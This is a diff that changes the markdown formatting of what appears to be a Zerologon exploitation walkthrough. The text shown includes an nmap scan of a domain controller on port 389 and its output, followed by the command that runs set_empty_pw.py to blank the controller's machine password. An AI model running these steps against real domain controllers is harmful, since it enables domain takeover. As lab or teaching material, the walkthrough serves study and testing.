@@ -13,6 +13,7 @@ All domain controllers listen on port 389
 ```
 sudo nmap -p389 -sV 192.168.1.28
 ```
+```
 sudo nmap -p389 -sV 192.168.1.28
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 22:25 PDT
 Nmap scan report for 192.168.1.28
@@ -25,7 +26,7 @@ Service Info: Host: ZEROLOGON-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds
-
+```
 
 ## change directory to the zerologon exploit folder:
 
@@ -36,7 +37,7 @@ cd ~/zerologon
 ## 1st run set_empty_pw.py to exploit the machine:
 
 this will set the password to an empty string
-python3 set_empty_pw.py <NetBIOS-name> <IP-Address>
+python3 set_empty_pw.py \<NetBIOS-name\> <IP-Address>
 ```
 python3 set_empty_pw.py ZEROLOGON-DC 192.168.1.28
 ```
